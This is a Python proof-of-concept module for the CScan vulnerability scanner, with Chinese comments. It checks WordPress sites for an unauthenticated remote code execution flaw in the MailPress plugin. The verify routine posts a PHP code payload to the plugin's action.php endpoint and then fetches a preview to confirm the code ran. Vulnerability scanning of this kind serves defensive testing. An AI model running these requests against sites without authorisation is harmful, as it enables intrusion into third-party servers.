# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'WordPress_0001_p' # 平台漏洞编号，留空
    name = 'WordPress Mailpress Plugin 远程代码执行' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2016-06-21'  # 漏洞公布时间
    desc = '''
    Wordpress的Mailpress插件存在越权调用，在不登陆的情况下，可以调用系统某些方法，造成远程命令执行。
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/3960/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Mailpress Plugin'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6b8a8812-af76-4f80-b457-8bb40c8a4d44'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            #利用的是WordPress Mailpress Plugin漏洞，一般漏洞的地址是:wp-content/plugins/mailpress/mp-includes/action.php
            url = '''/wp-content/plugins/mailpress/mp-includes/action.php'''
            data = {
                "action": "autosave",
                "id": "0",
                "revision": "-1",
                "toemail":'',
                "toname":'',
                "fromemail":'',
                "fromname":'',
                "to_list": "1",
                "Theme":'',
                "subject": "<?php echo caf1a3dfb505ffed0d024130f58c5cfa;?>",
                "html":'',
                "plaintext":'',
                "mail_format": "standard",
                "autosave": "1"
            }

            payload='''?action=iview&id='''
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            request1 = requests.post('{target}{url}'.format(target=self.target,url=url),data=data)

            id = re.search(r"""id='(.?.)'""",request1.text).group(1)
                        
            request2 = requests.get('{target}{url}{payload}{id}'.format(target=self.target,url=url,payload=payload,id=id))            
            r = request2.text

            if (request2.status_code == 200) and ('caf1a3dfb505ffed0d024130f58c5cfa' in r):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()